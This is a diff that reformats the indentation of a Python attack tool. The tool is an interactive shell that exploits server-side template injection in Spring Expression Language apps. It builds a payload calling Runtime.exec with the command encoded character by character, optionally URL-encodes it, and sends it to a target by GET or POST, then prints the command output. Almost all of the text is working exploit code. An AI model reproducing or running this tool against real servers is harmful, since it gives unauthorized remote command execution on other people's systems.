@@ -21,41 +21,41 @@ prefix_char=args.prefix_character
 post_data=args.post_data
 
 def yellow(string):
-	return '\033[1;33m%s\033[0m' % string
+    return '\033[1;33m%s\033[0m' % string
 
 def debug(x,y):
-	if DEBUG:
-		print(x+yellow(y))
+    if DEBUG:
+        print(x+yellow(y))
 
 class Terminal(Cmd):
-	start_time=strftime("%H:%M:%S", gmtime())
-	prompt=yellow('[%s] ==> ' % start_time)
+    start_time=strftime("%H:%M:%S", gmtime())
+    prompt=yellow('[%s] ==> ' % start_time)
 
-	def decimal_encode(self,args):
+    def decimal_encode(self,args):
 
-		debug('URL Encoding: ',str(url_encode))
+        debug('URL Encoding: ',str(url_encode))
 
-		command=args
+        command=args
 
-		decimals=[]
+        decimals=[]
 
-		for i in command:
-			decimals.append(str(ord(i)))
+        for i in command:
+            decimals.append(str(ord(i)))
 
-		payload=f'{prefix_char}{{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString({decimals[0]})'
+        payload=f'{prefix_char}{{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString({decimals[0]})'
 
-		for i in decimals[1:]:
-			line='.concat(T(java.lang.Character).toString({}))'.format(i)
-			payload+=line
+        for i in decimals[1:]:
+            line='.concat(T(java.lang.Character).toString({}))'.format(i)
+            payload+=line
 
-		payload+=').getInputStream())}'
-		if url_encode:
-			payload_encoded=urllib.parse.quote_plus(payload,safe='')
-			debug('Payload: ',payload_encoded)
-			return payload_encoded
-		else:
-			debug('Payload: ',payload)
-			return payload
+        payload+=').getInputStream())}'
+        if url_encode:
+            payload_encoded=urllib.parse.quote_plus(payload,safe='')
+            debug('Payload: ',payload_encoded)
+            return payload_encoded
+        else:
+            debug('Payload: ',payload)
+            return payload
 
     # From https://stackoverflow.com/a/52014520
     def parse_var(self,args):
@@ -87,16 +87,16 @@ class Terminal(Cmd):
                 d[key] = value
         return d
 
-	def ssti(self,args):
-		start_time=strftime("%H:%M:%S", gmtime())
-		base_url=target
-		payload=self.decimal_encode(args)
+    def ssti(self,args):
+        start_time=strftime("%H:%M:%S", gmtime())
+        base_url=target
+        payload=self.decimal_encode(args)
 
-		url=base_url
+        url=base_url
 
-		headers = {} #This usually has to be added but there is a Burp extension to convert burp headers into python request headers.
-		debug('Headers: ',str(headers))
-		try:
+        headers = {} #This usually has to be added but there is a Burp extension to convert burp headers into python request headers.
+        debug('Headers: ',str(headers))
+        try:
             # GET case
             if not post_data:
                 url += payload
@@ -110,29 +110,29 @@ class Terminal(Cmd):
                 debug('POST url: ', url)
                 debug('POST data: ', data)
                 response=requests.post(url, headers=headers, data=data)
-			output=response.text
-			#The next line is used to parse out the output, this might be clean but it also may need work. Depends on the vuln.
+            output=response.text
+            #The next line is used to parse out the output, this might be clean but it also may need work. Depends on the vuln.
 
-			# ssti=str(output).split('&#39;')[1].rstrip()
+            # ssti=str(output).split('&#39;')[1].rstrip()
 
-			print (output)
-		except Exception as e:
-			print('Unable to send command: %s' % yellow(args))
-			print('Qutting at [%s]' % yellow(start_time))
+            print (output)
+        except Exception as e:
+            print('Unable to send command: %s' % yellow(args))
+            print('Qutting at [%s]' % yellow(start_time))
             print('Reason: ' % yellow(e))
-			quit()
-			#Quit after a command fails just incase the server has been killed.
+            quit()
+            #Quit after a command fails just incase the server has been killed.
 
 
-	def default(self,args):
-		self.ssti(args)
-		print()
+    def default(self,args):
+        self.ssti(args)
+        print()
 try:
-	if DEBUG == True:
-		debug('Target: ',target)
-	term=Terminal()
-	term.cmdloop()
+    if DEBUG == True:
+        debug('Target: ',target)
+    term=Terminal()
+    term.cmdloop()
 except KeyboardInterrupt:
-	print()
-	print('Detected CTRL+C, exiting...')
-	quit()
+    print()
+    print('Detected CTRL+C, exiting...')
+    quit()
